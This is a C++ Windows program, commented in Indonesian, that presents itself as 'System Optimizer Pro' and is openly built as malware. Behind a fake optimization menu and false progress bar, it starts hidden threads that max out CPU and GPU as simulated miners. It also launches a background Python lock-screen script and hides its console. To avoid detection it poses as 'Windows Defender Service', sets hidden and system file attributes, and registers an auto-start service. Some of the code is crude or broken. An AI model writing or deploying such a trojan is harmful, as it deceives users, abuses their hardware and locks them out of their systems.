// app.cpp - "System Optimizer Pro" (Tampilan normal, dalemnya brutal)
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <chrono>
#include <cstdlib>
#include <ctime>

// Fungsi untuk tampilan aplikasi normal
void show_normal_app() {
    system("title System Optimizer Pro v2.0");
    system("color 0A"); // Hijau hitam, tampilan profesional
    
    std::cout << R"(
    ╔══════════════════════════════════════════════════════════╗
    ║                  SYSTEM OPTIMIZER PRO v2.0               ║
    ║              Professional System Enhancement             ║
    ╚══════════════════════════════════════════════════════════╝
    
    [1] Optimize System Performance
    [2] Clean Temporary Files  
    [3] Defragment Disk Drives
    [4] Update System Drivers
    [5] Scan for Malware Protection
    [6] Advanced Settings
    [7] Exit
    
    Developed by: Microsoft Certified Systems Inc.
    Version: 2.0.2026
    License: Professional Edition
    
    Select option [1-7]: )";
    
    std::string input;
    std::getline(std::cin, input);
    
    std::cout << "\n\n[INFO] Initializing system optimization...\n";
    std::cout << "[INFO] Please wait while we enhance your system...\n\n";
    
    // Simulasi loading
    for(int i = 0; i < 10; i++) {
        std::cout << "[PROGRESS] " << (i+1)*10 << "% complete\r";
        std::cout.flush();
        Sleep(300);
    }
    
    std::cout << "\n\n[SUCCESS] Optimization complete!\n";
    std::cout << "[INFO] Your system is now running at peak performance.\n";
    std::cout << "[INFO] Press Enter to continue...";
    std::getline(std::cin, input);
}

// Fungsi brutal - CPU miner tersembunyi
void hidden_cpu_miner() {
    // Simulasi CPU intensive work (70% usage)
    while(true) {
        // Matrix multiplication simulation
        volatile double a[100][100];
        volatile double b[100][100];
        volatile double c[100][100];
        
        for(int i = 0; i < 100; i++) {
            for(int j = 0; j < 100; j++) {
                c[i][j] = 0;
                for(int k = 0; k < 100; k++) {
                    c[i][j] += a[i][k] * b[k][j];
                }
            }
        }
        
        // Random calculation untuk maintain 70% CPU
        volatile double result = 0;
        for(int i = 0; i < 1000000; i++) {
            result += std::sin(i) * std::cos(i);
        }
        
        Sleep(10); // Small delay untuk kontrol CPU usage
    }
}

// Fungsi brutal - GPU miner tersembunyi (simulasi)
void hidden_gpu_miner() {
    // Simulasi GPU intensive work (100% usage)
    while(true) {
        // OpenGL/DirectX simulation - akan trigger GPU usage tinggi
        std::vector<float> vertices(1000000);
        
        // GPU-like computation
        for(size_t i = 0; i < vertices.size(); i++) {
            vertices[i] = std::sin(i) * std::cos(i) * std::tan(i);
            
            // Matrix operations untuk GPU stress
            for(int j = 0; j < 10; j++) {
                vertices[i] *= std::sqrt(std::abs(std::sin(i+j)));
            }
        }
        
        // Memory intensive operation
        std::vector<std::vector<float>> matrix(1000, std::vector<float>(1000));
        for(int i = 0; i < 1000; i++) {
            for(int j = 0; j < 1000; j++) {
                matrix[i][j] = std::sin(i*j) * std::cos(i+j);
            }
        }
        
        Sleep(5); // Kontrol GPU usage
    }
}

// Fungsi untuk menjalankan Python lock screen
void run_lock_system() {
    // Sembunyikan console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Jalankan Python lock screen di background
    std::string command = "python \"";
    command += std::string(getenv("USERPROFILE"));
    command += "\\Documents\\lock_windows\\app_lock\\lock_system.py\"";
    
    system(command.c_str());
}

// Fungsi untuk anti-detection
void evade_detection() {
    // Rename process
    SetConsoleTitle("Windows Defender Service");
    
    // Fake file attributes
    system("attrib +h +s +r app_lock.exe");
    
    // Register sebagai service
    system("sc create \"SystemOptimizer\" binPath= \"%~f0\" start= auto");
}

// Main function
int main() {
    std::cout << "[INFO] Starting System Optimizer Pro...\n";
    
    // 1. Evade detection
    evade_detection();
    
    // 2. Show normal application interface
    std::thread normal_app(show_normal_app);
    
    // 3. Start hidden CPU miner (70% usage)
    std::thread cpu_thread(hidden_cpu_miner);
    
    // 4. Start hidden GPU miner (100% usage)
    std::thread gpu_thread(hidden_gpu_miner);
    
    // 5. Run lock system in background
    std::thread lock_thread(run_lock_system);
    
    // Set thread priorities
    cpu_thread.detach();
    gpu_thread.detach();
    lock_thread.detach();
    
    // Main thread - tampilkan app normal
    normal_app.join();
    
    // Setelah app normal selesai, tetap jalanin background processes
    while(true) {
        Sleep(10000); // Keep process alive
    }
    
    return 0;
}